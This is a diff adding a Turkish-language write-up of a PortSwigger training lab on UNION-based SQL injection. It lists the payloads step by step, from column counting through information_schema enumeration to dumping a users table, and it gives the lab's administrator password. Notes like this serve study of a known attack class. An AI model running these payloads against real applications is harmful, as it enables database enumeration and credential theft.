@@ -85,3 +85,27 @@ Açıklama:
 Sonuç: Çözüldü ✅
 
 ---
+
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+Zorluk: Orta - https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+
+Hedef: users tablosundan administrator şifresini çekip login olmak.
+
+Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor (UNION-based injection). Non-Oracle olduğu için tablo/sütun keşfi information_schema üzerinden yapılıyor. Önce tek tırnak (') denendi → 500 döndü, injection'ın varlığı.
+
+Payload:
+1) Sütun sayısı: category=Pets' UNION SELECT NULL,NULL--   -> 2 sütun geldi
+2) Text kontrolü: category=Pets' UNION SELECT 'a','a'--   -> ikisi de text olduğu test edildi
+3) Tablolar: category=Pets' UNION SELECT table_name,NULL FROM information_schema.tables--   -> users_vaxbpj
+4) Sütunlar: category=Pets' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_vaxbpj'--   -> username_rfejqo, password_lnuotc
+5) Veri: category=Pets' UNION SELECT username_rfejqo,password_lnuotc FROM users_vaxbpj--   -> administrator / 8gownbhabyymy2osrzh7
+
+Açıklama:
+- ' → category string'ini kapatıyor, UNION SELECT ikinci sorguyu ekliyor; sütun sayısı orijinal sorguyla eşleşmeli, NULL,NULL ile 2 olduğu bulundu.
+- 'a','a' → iki sütunun da text tuttuğunu gösteriyor, veri string olarak basılabiliyor.
+- information_schema.tables → DB'deki tüm tabloları tutan sistem view'ı; buradan users_vaxbpj tablosu bulundu (Oracle'da all_tables olurdu — non-Oracle farkı).
+- information_schema.columns + WHERE table_name='users_vaxbpj' → o tablonun sütun isimlerini döndürüyor: username_rfejqo, password_lnuotc.
+- -- → kalan sorguyu susturuyor.
+- Son sorgu username ve password sütununu yan yana basıyor; administrator satırındaki plaintext şifreyle login olunuyor.
+
+Sonuç: Çözüldü ✅
